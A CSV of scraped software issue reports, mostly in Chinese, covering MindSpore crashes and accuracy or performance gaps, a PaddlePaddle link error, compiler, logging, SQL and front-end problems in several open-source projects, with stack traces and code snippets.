title,text
[CT][MS][Upsamplenearest3d]test report coredump when scales dtype is tuple[float] and input dtype is fp64 at cpu,"cpu后端 算子Upsamplenearest3d参数scales传tuple[float]，input dtype 是 fp64， 会coredump / 硬件环境: /device CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph cpu后端执行测试用例 正确执行 cpu : ascend 报错   <code>: def test_upsamplenearest3d_attr_scales_tuple_float_fp64(): x = Tensor(np.random.randn(19, 20, 78, 512, 56), dtype=mstype.float64) fact = UpsampleNearest3dMock(attributes={'scales': (3.8, 4.1, 0.5)}, inputs=[x]) fact.forward_cmp() fact.grad_cmp() test_upsamplenearest3d.py Fatal Python error: Segmentation fault Thread 0x00007f5fe6baa740 (most recent call first): File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/common/api.py"", line 711 in end_graph File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 600 in __call__ File ""/home/cao_test/MindSporeTest/share/utils.py"", line 182 in __call__ File ""/home/cao_test/MindSporeTest/share/ops/primitive/upsamplenearest3d_ops.py"", line 42 in forward_mindspore_impl File ""/home/cao_test/MindSporeTest/share/ops/primitive/upsamplenearest3d_ops.py"", line 85 in forward_cmp File ""/home/cao_test/MindSporeTest/operations/test_upsamplenearest3d.py"", line 110 in test_upsamplenearest3d_attr_scales_tuple_float_fp64 File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/high-caory/bin/pytest"", line 8 in &lt;module&gt; Segmentation fault (core dumped) def test_upsamplenearest3d_attr_scales_tuple_float_fp64(): x = Tensor(np.random.randn(19, 20, 78, 512, 56), dtype=mstype.float64) fact = UpsampleNearest3dMock(attributes={'scales': (3.8, 4.1, 0.5)}, inputs=[x]) &gt; fact.forward_cmp() E RuntimeError: mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:464 PreprocessBeforeRunGraph] Preprocess faile d before run graph 6, E error msg: mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_memory_manager.cc:96 MallocStaticMem] Fail to alloc memory, size: 528 85396992, memory statistics: E Device HBM memory size: 32768M E MindSpore Used memory size: 30684M E MindSpore memory base address: 0x120800000000 E Total Static Memory size: 29184M E Total Dynamic memory size: 0M E Dynamic memory size of this graph: 0M"
[CT][MS] cpu后端跑5G网络会大概率出现随机coredump.,"cpu后端跑5G网络会大概率出现随机coredump cpu后端跑5G网络会大概率出现随机coredump / 硬件环境: /device /CPU/ : -- MindSpore version : commit_id = ''[sha1]:2e784516,[branch]:(HEAD,mr-origin-44322)'' -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph 外部提供的mae_aau_predict_test.zip cd retrains ; python api.py run pass   <code>: 2022-11-04 03:01:13.406 - 7676 - 140227592169280 - NAIE - INFO - api.py[line:99] - retrain_task - Current evaluation metrics of Model user_model_mh_5G_anhui_dist:{'mape': 1.5256418, 'mae': 0.057893295, 'mape_per': 1.0, 'open_close': 1.0, 'mae_per': 1.0} 2022-11-04 03:01:13.407 - 7676 - 140227592169280 - NAIE - INFO - api.py[line:100] - retrain_task - *************** Start HW Cloud retrain ************** 2022-11-04 03:01:13.408 - 7676 - 140227592169280 - NAIE - INFO - train_main.py[line:8] - by_train - -----&gt;&gt;train start&lt;&lt;----- 2022-11-04 03:01:13.411 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:919] - train_md_model - start to init TrainFeatureExtractor 2022-11-04 03:01:13.413 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:921] - train_md_model - start to create_features 2022-11-04 03:01:13.414 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:110] - load_ori_data - init cell_traffic data shape: (144000, 7) 2022-11-04 03:01:13.992 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:113] - load_ori_data - cell_traffic span: (Timestamp('2022-09-11 10:00:00'), Timestamp('2022-10-11 09:00:00')) 2022-11-04 03:01:13.996 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:131] - load_ori_data - data_period: DatetimeIndex(['2022-09-11 10:00:00', '2022-09-11 11:00:00',\n '2022-09-11 12:00:00', '2022-09-11 13:00:00',\n '2022-09-11 14:00:00', '2022-09-11 15:00:00',\n '2022-09-11 16:00:00', '2022-09-11 17:00:00',\n '2022-09-11 18:00:00', '2022-09-11 19:00:00',\n ...\n '2022-10-11 00:00:00', '2022-10-11 01:00:00',\n '2022-10-11 02:00:00', '2022-10-11 03:00:00',\n '2022-10-11 04:00:00', '2022-10-11 05:00:00',\n '2022-10-11 06:00:00', '2022-10-11 07:00:00',\n '2022-10-11 08:00:00', '2022-10-11 09:00:00'],\n dtype='datetime64[ns]', length=720, freq='60T') 2022-11-04 03:01:13.998 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:132] - load_ori_data - train_period: DatetimeIndex(['2022-09-11 10:00:00', '2022-09-11 11:00:00',\n '2022-09-11 12:00:00', '2022-09-11 13:00:00',\n '2022-09-11 14:00:00', '2022-09-11 15:00:00',\n '2022-09-11 16:00:00', '2022-09-11 17:00:00',\n '2022-09-11 18:00:00', '2022-09-11 19:00:00',\n ...\n '2022-10-04 03:00:00', '2022-10-04 04:00:00',\n '2022-10-04 05:00:00', '2022-10-04 06:00:00',\n '2022-10-04 07:00:00', '2022-10-04 08:00:00',\n '2022-10-04 09:00:00', '2022-10-04 10:00:00',\n '2022-10-04 11:00:00', '2022-10-04 12:00:00'],\n dtype='datetime64[ns]', length=555, freq='60T') /home/zhujunan/temp3/mae_aau_predict_test/algorithm/train_data_process_x86.py:144: SettingWithCopyWarning: A value is trying to be set on a copy of a slice from a DataFrame See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy filters[np.isnan(filters)] = 9999 /home/zhujunan/temp3/mae_aau_predict_test/algorithm/train_data_process_x86.py:146: SettingWithCopyWarning: A value is trying to be set on a copy of a slice from a DataFrame See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy filters[np.isnan(data_train[self.target[i]])] = 9999 2022-11-04 03:01:14.048 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:152] - load_ori_data - Train start time: 2022-09-11 10:00:00 2022-11-04 03:01:14.049 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:153] - load_ori_data - Train columns: Index(['date_time', 'cgi', 'type', 'average_user', 'max_user',\n 'shutdown_duration', 'createdTime'],\n dtype='object') 2022-11-04 03:01:15.718 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:258] - create_static_real_features - Number of complete cgis: 100 2022-11-04 03:01:15.810 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:380] - create_obs_feature - columns:average_user 2022-11-04 03:01:22.447 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:380] - create_obs_feature - columns:max_user ############# None Time features shape======== (100, 720, 8) Obs features shape======== (100, 720, 2) labels shape======== (100, 720, 1) restore values shape======== (100, 2, 1) real features shape======== (100, 9) cat features shape======== (100, 1) 2022-11-04 03:01:29.355 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:612] - create_features - batch_size:128 model_config= {'model_name': 'user_model_mh_5G_anhui_dist', 'batch_size': 128, 'input_steps': 24, 'output_steps': 3, 'dropout_rate': 0.05, 'n_timefeatures': 8, 'n_obsfeatures': 2, 'use_attention': 'multi_head', 'hidden_layer_size': 128, 'n_static_cat': 1, 'n_static_real': 9, 'loss': 'mae', 'quantiles': [0.02, 0.05, 0.1, 0.15, 0.2, 0.25, 0.3, 0.35, 0.4, 0.45, 0.5, 0.55, 0.6, 0.65, 0.7, 0.75, 0.8, 0.85, 0.9, 0.95, 0.98], 'category_counts': [101], 'embedding_size': 8, 'learning_rate': 0.0001, 'early_stopping_patience': 5, 'LR_patience': 3, 'num_epochs': 1, 'steps_per_epoch': 526, 'validation_steps': 168, 'data_multiprocessing': False, 'n_workers': 1, 'output_size': 1, 'n_heads': 4, 'custom_steps': False, 'normalization': 'maxmin', 'normalize_target': True, 'use_log1p': True, 'lag_days': [0], 'online_mode': True} 2022-11-04 03:01:29.356 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:945] - train_md_model - start to create train dataset 2022-11-04 03:01:29.357 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:103] - create_dataset - else: start mindspore GeneratorDataset 2022-11-04 03:01:29.358 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:109] - create_dataset - else: mindspore GeneratorDataset end 2022-11-04 03:01:29.359 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:115] - create_dataset - input data after repeat 2022-11-04 03:01:29.360 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:955] - train_md_model - start to create val dataset 2022-11-04 03:01:29.361 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:103] - create_dataset - else: start mindspore GeneratorDataset 2022-11-04 03:01:29.362 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:109] - create_dataset - else: mindspore GeneratorDataset end 2022-11-04 03:01:29.362 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:115] - create_dataset - input data after repeat 2022-11-04 03:01:29.363 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:966] - train_md_model - after create val dataset 2022-11-04 03:01:29.365 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:972] - train_md_model - after dump file [WARNING] ME(7676:140227592169280,MainProcess):2022-11-04-03:01:29.366.644 [mindspore/nn/loss/loss.py:174] '_Loss' is deprecated from version 1.3 and will be removed in a future version, use 'LossBase' instead. 2022-11-04 03:01:29.743 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:997] - train_md_model - after build rnn model 2022-11-04 03:01:29.744 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1009] - train_md_model - start calcu maeloss metric 2022-11-04 03:01:29.746 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1025] - train_md_model - calcu maeloss metric close 2022-11-04 03:01:29.747 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1028] - train_md_model - after my train with loss cell 2022-11-04 03:01:29.748 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1033] - train_md_model - after my eval with loss cell 2022-11-04 03:01:30.130 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1036] - train_md_model - after adam net opt [WARNING] ME(7676:140227592169280,MainProcess):2022-11-04-03:01:30.372.417 [mindspore/train/model.py:1091] For EvalCallBackNew callback, {'step_end', 'end', 'epoch_begin', 'epoch_end'} methods may not be supported in later version, Use methods prefixed with 'on_train' or 'on_eval' instead when using customized callbacks. Segmentation fault (core dumped)"
"[MS] set_auto_parallel_context(all_reduce_fusion_config=[8, 16]) doesn't take effect",": /device gpu /device cpu : -- MindSpore version :1.3.0.B005版本 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_setautoparallelcontext_check context.set_auto_parallel_context(all_reduce_fusion_config=[8, 16]) print(context.get_auto_parallel_context(""all_reduce_fusion_config"")) 设置all_reduce_fusion_config参数为[8,16]，但通过get_auto_parallel_context方法打印还是[] set_auto_parallel_context方法设置all_reduce_fusion_config参数不生效   <code>: INFO 2021-06-22 17:23:12 - root - base.py:__init__:27 - This is Ascend910 environment. INFO 2021-06-22 17:23:12 - root - base.py:print_hostname:170 - Host name is [10-90-55-95], Using device6 INFO 2021-06-22 17:23:12 - root - case_base.py:__init__:36 - env_dev is 0: 0代表A+X，1代表GPU(V100-PCIE)，2代表CPU，3代表A+K，4代表GPU(V100-SXM2) INFO 2021-06-22 17:23:13 - root - test_setautoparallelcontext_check.py:setup:12 - Set up in case. !!!!!!!!!!!!!!!!!!!!11 [] INFO 2021-06-22 17:23:13 - root - test_setautoparallelcontext_check.py:teardown:44 - Teardown case F ====================================================================== FAIL: test_scripts.mindspore.features.context.auto_parallel_context.test_setautoparallelcontext_check.Test_setautoparallel_check.test_run ---------------------------------------------------------------------- Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/nose/case.py"", line 198, in runTest self.test(*self.arg) File ""/home/jenkins/workspace/TDT_deployment/solution_test/test_scripts/mindspore/features/context/auto_parallel_context/test_setautoparallelcontext_check.py"", line 41, in test_run assert context.get_auto_parallel_context(""all_reduce_fusion_config"") == [8, 16] AssertionError: -------------------- &gt;&gt; begin captured logging &lt;&lt; -------------------- rootn9lWOJ0w: INFO: This is Ascend910 environment. rootn9lWOJ0w: INFO: Host name is [10-90-55-95], Using device6 rootn9lWOJ0w: INFO: env_dev is 0: 0代表A+X，1代表GPU(V100-PCIE)，2代表CPU，3代表A+K，4代表GPU(V100-SXM2) rootn9lWOJ0w: INFO: Set up in case. rootn9lWOJ0w: INFO: Teardown case --------------------- &gt;&gt; end captured logging &lt;&lt; --------------------- ---------------------------------------------------------------------- Ran 1 test in 0.003s FAILED (failures=1)"
Clang compile error: `suggest braces around initialization of subobject`,"In the current code, we are using C++11's new feature 'list initialization' to initialize and , like this: With GCC compiler, everything is well. However, if we use Clang and with , we are going to get the following error: This makes our newest code failing to be compiled on Mac. To fix this, we shall initialize with instead of See: https://stackoverflow.com/questions/31555584/why-is-clang-warning-suggest-braces-around-initialization-of-subobject-wmis   <code>: std::array Eigen::array auto arr = std::array&lt;int, 3&gt;({1,2,3}); -Werror,-Wmissing-braces error: suggest braces around initialization of subobject [-Werror,-Wmissing-braces] array {{...}} {}"
组件值转换统一化,组件值转换统一化 增加 扩展方法，方便讲字符串类型数据转换为任意类型数据   <code>: TryConvertTo
Add hinge loss op,"Resolves #5757: Optimize RoI Pooling layer by NEON intrinsics. by adding an implementation of a hinge loss operator for a binary classification scenario. The hinge loss for a prediction (x) and a target label (y), where x can be in (-inf, inf) and y can be +1 or -1, is: Future work: To extend this to multi-class setting More efficient implementation   <code>: hloss(x, y) = max(1 - y.x, 0)"
ZeroCopyTensor无法使用double类型,"使用C++部署预测模型，模型中参数是float64类型，预测程序中使用double类型，提示错误，找不到实例化的模板函数： paddle::test_induced_field(int, int)': /home/tao/work/tools/induced_vel_process/induced_vel_deploy/main.cpp:75: undefined reference to void paddle::ZeroCopyTensor::copy_to_cpu(double*)' collect2: error: ld returned 1 exit status CMakeFiles/induced_vel_deploy.dir/build.make:111: recipe for target 'induced_vel_deploy' failed make[2]: *** [induced_vel_deploy] Error 1 CMakeFiles/Makefile2:95: recipe for target 'CMakeFiles/induced_vel_deploy.dir/all' failed make[1]: *** [CMakeFiles/induced_vel_deploy.dir/all] Error 2 Makefile:103: recipe for target 'all' failed make: *** [all] Error 2` C++程序： `#include &lt;gflags/gflags.h&gt; #include &lt;glog/logging.h&gt; #include #include #include #include #include ""paddle/include/paddle_inference_api.h"" namespace paddle{ using paddle::AnalysisConfig; } int main() { std::cout &lt;&lt; ""Induced field model inference..."" &lt;&lt; std::endl; } `   <code>: Scanning dependencies of target induced_vel_deploy [ 50%] Building CXX object CMakeFiles/induced_vel_deploy.dir/main.cpp.o [100%] Linking CXX executable induced_vel_deploy CMakeFiles/induced_vel_deploy.dir/main.cpp.o: In function void paddle::ZeroCopyTensor::copy_from_cpu&lt;double&gt;(double const*)' /home/tao/work/tools/induced_vel_process/induced_vel_deploy/main.cpp:93: undefined reference to DEFINE_string(dirname, ""../infer_model"", ""Directory of the inference model.""); using Time = decltype(std::chrono::high_resolution_clock::now()); Time time() { return std::chrono::high_resolution_clock::now(); } double time_diff(Time t1, Time t2) { typedef std::chrono::microseconds ms; auto diff = t2 - t1; ms counter = std::chrono::duration_cast&lt;ms&gt;(diff); return counter.count() / 1000.0f; } void prepare_trt_config(AnalysisConfig* config, int batch_size) { // 1. Model directory // case 1: model_dir contains two files: model + params //config-&gt;SetModel(FLAGS_dirname + ""/model"", FLAGS_dirname + ""/params""); // case 2: model_dir contains one model file (__model__) and multiple params config-&gt;SetModel(FLAGS_dirname); // 2. Device // config-&gt;DisableGpu(); config-&gt;EnableUseGpu(500, 0); // 3. General optimization // Graph optimization, including operator fusion //config-&gt;SwitchIrOptim(true); // Memory reuse //config-&gt;EnableMemoryOptim(); // We use ZeroCopyTensor here, so we set config-&gt;SwitchUseFeedFetchOps(false) config-&gt;SwitchUseFeedFetchOps(false); } void test_induced_field(int batch_size, int repeat) { AnalysisConfig config; prepare_trt_config(&amp;config, batch_size); auto predictor = CreatePaddlePredictor(config); int channels = 1; int height = 1; int width = 8; // 8 floats as input vector int input_num = channels * height * width * batch_size; // prepare inputs //float *input = new float[input_num]; //memset(input, 0, input_num * sizeof(float)); double input[] = {9.38945293e+00, 9.54218483e+00, 4.00937128e+00, 2.98900008e-01, 7.20000000e+02, 1.02042408e+01, 9.72727203e+00, 4.30936718e+00}; CHECK(sizeof(input) == input_num * sizeof(double)); auto input_names = predictor-&gt;GetInputNames(); auto input_t = predictor-&gt;GetInputTensor(input_names[0]); input_t-&gt;Reshape({batch_size, channels, height, width}); input_t-&gt;copy_from_cpu(input); // run auto time1 = time(); CHECK(predictor-&gt;ZeroCopyRun()); auto time2 = time(); std::cout &lt;&lt; ""batch: "" &lt;&lt; batch_size &lt;&lt; "" predict cost: "" &lt;&lt; time_diff(time1, time2) / static_cast&lt;float&gt;(repeat) &lt;&lt; "" ms"" &lt;&lt; std::endl; // get the output std::vector&lt;double&gt; out_data; auto output_names = predictor-&gt;GetOutputNames(); auto output_t = predictor-&gt;GetOutputTensor(output_names[0]); std::vector&lt;int&gt; output_shape = output_t-&gt;shape(); int out_num = std::accumulate(output_shape.begin(), output_shape.end(), 1, std::multiplies&lt;int&gt;()); out_data.resize(out_num); output_t-&gt;copy_to_cpu(out_data.data()); for ( size_t j = 0; j &lt; out_num; j++ ) { LOG(INFO) &lt;&lt; ""output[ "" &lt;&lt; j &lt;&lt; "" ]: "" &lt;&lt; out_data[j]; } } paddle::test_induced_field(1, 1); return 0;"
【MindSpore】【Ascend】【C类】【EDCN】评估精度不达标,"评估出精度结果AUC: 0.789987895909914，与资料中给的精度标准对比波动范围超出0.5%，精度不达标。 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: /device ascend : -- CANN 版本: (CANN 5.0.4 B065) --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 --mindspore版本：1.6.1 1、启动容器。 2、完成单卡全量训练。bash run_standalone_train.sh 0 Ascend ../data/mindrecord/ 3、开始评估精度。bash run_eval.sh 0 Ascend /ssd1/wx/EDCN/data/ /ssd1/wx/EDCN/scripts/train_single_Ascend/checkpoint/edcn-10_41322.ckpt 评估精度达标，与精度标准值相比波动不超过0.5%。   <code>: [WARNING] ME(29836:281473501863952,MainProcess):2022-09-05-01:43:40.823.635 [mindspore/dataset/engine/datasets_standard_format.py:221] WARN: global shuffle is not used. 2022-09-05 01:44:55 AUC: 0.789987895909914, eval time: 70.99136662483215s."
swagger-bootstrap-ui文档扩展授权没有效果,"pigx版本: 3.0 操作系统: win7 是否修改包名: 没有 无报错   <code>: 1访问链接 http://pigx-gateway:9999/doc.html 2点击Authorize 菜单 3.输入token 并保存 4.调试接口，返回没有授权 { ""code"": 1, ""msg"": ""Full authentication is required to access this resource"", ""data"": ""Full authentication is required to access this resource"" }"
"LogFactory, debug日志等级开启不了","使用的JDK版本和Hutool版本 JDK1.8 Hutool 4.1.19 debug等级开启失败，日志不打印 ![输入图片说明] (https://images.gitee.com/uploads/images/2018/1031/151905_cc1629f4_1141100.png ""屏幕截图.png"") 打印结果： 日志框架是 默认slf4j   <code>: Log log = LogFactory.get(); boolean debugEnabled = log.isDebugEnabled(); log.info(""debugEnabled:{}"",debugEnabled); log.debug(""debug"");"
sql查询字段重复问题,"SELECT * FROM ( SELECT .<em>, (SELECT realname FROM 72crm_admin_user WHERE user_id=.) AS , (SELECT realname FROM 72crm_admin_user WHERE user_id=.) AS , . AS , .</em> FROM AS LEFT JOIN ON . = . JOIN ( SELECT b.batch_id AS field_batch_id ,MAX(CASE WHEN . = '是否关键决策人' THEN . END) AS ,MAX(CASE WHEN . = 'remark' THEN . END) AS FROM 72crm_admin_fieldv AS a RIGHT JOIN (SELECT batch_id FROM 72crm_crm_contacts AS a WHERE 1=1 AND create_user_id IN (3) AND create_time BETWEEN '2020-01-01 00:00:00' AND '2020-12-31 23:59:59' ORDER BY update_time DESC LIMIT 0,15 ) AS b ON a.batch_id = b.batch_id GROUP BY b.batch_id ) ON . = . ) AS views WHERE 1=1 ORDER BY update_time DESC 查询了72crm_crm_contacts表中的remark（a.*），然后又在72crm_admin_fieldv表中as一个remark，这是什么意思？现在字段冲突报错，目前我将72crm_admin_fieldv的remark改了一个名字，请问是否会有影响？   <code>: a a create_user_id create_user_name a owner_user_id owner_user_name d customer_name customer_name z 72crm_crm_contacts a 72crm_crm_customer d a customer_id d customer_id a name a value 是否关键决策人 a name a value remark z a batch_id z field_batch_id"
进度条用for循环采集循环流程的数据，循环结束时才渲染,"帮看一下layui进度条的问题： 我现在将进度条用for循环，采集循环流程的数据，进行更改渲染变化，整个循环过程都进度条没有动，到循环结束时才渲染一下。我在for循环加了一条输出进度条值：console.log（进度条值），看进度条值都到了100了，循环全部执行完了，进度条才从0开始渲染，最后到100。也就是我们要等一倍的时间。最好的效果，是输出进度条值，要与循环同步。请问有什么好办法在循环时同步动态更改进度值？ var element = layui.element; element.render('progress'); for (var i = 0; i &lt; 100; i++) { }   <code>: (function(i) { setTimeout(function() { element.progress('demo', (i+1) + '%'); }, i * 360); })(i);"
add nn.ZeroPad2d for Padding,"RFC Use this template for requirement to be discussed Requirement Use this template for Confirmed requirements Backgroud（背景信息） Describe/Explain the status of the problem you wish to solve. Attach relevant issues if there is any. Origin（信息来源） Explain which department/team made this request so that its priority can be given. Benefit / Necessity （价值/作用） Describe/Explain the key value by fulfilling the request. Design（设计方案） Describe/Explain the general idea of the design. Pseudo-code is allowed add nn.ZeroPad2d for Padding, same as   <code>: torch.nn.ZeroPad2d"
登录成功后，重复登录会一直在登录页面,"解决办法 重写isAccessAllowed方法，在里面添加是否是登陆判断 @加贝 protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {   <code>: if(isLoginRequest(request, response) &amp;&amp; isLoginSubmission(request, response)){ return false; } return super.isAccessAllowed(request, response, mappedValue); }"
[ST][MS][NET][resnet50-thor][ascend 8p]FPS[11570 can not reach 12500,"resnet50-thor网络在910环境8p训练性能11570/fps达不到12500 / 硬件环境: /device ascend : -- MindSpore version :r.18 commit_id:5231ff8e -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C81/20220415 (/): /mode graph test_ms_resnet50_thor_imagenet_train_check_loss_ascend_8p.py get code from models sh run_distribute_train.sh 网络训练成功，性能精度达标 走给王程浩   <code>: epoch time: 394659.493 ms, per step time: 78.869 ms epoch time: 110715.970 ms, per step time: 22.125 ms"
